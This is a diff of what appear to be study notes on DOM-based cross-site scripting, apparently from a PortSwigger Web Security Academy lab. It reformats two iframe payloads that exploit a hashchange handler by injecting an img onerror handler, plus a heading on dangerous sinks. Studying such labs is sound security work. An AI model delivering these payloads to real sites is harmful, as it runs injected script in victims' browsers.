@@ -112,8 +112,13 @@ $(window).on('hashchange', function(){
 
 
 // payload:
+```htm
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">
+```
+
+```htm
 <iframe src="https://ac201fda1fe56926c03d960700870032.web-security-academy.net#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
 {/* to be stored on attacker server and deliverd as url */}
 
 
@@ -201,7 +206,7 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 
 
-Which sinks can lead to DOM-XSS vulnerabilities?
+# ***Which sinks can lead to DOM-XSS vulnerabilities?***
 
 // The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
 document.write()
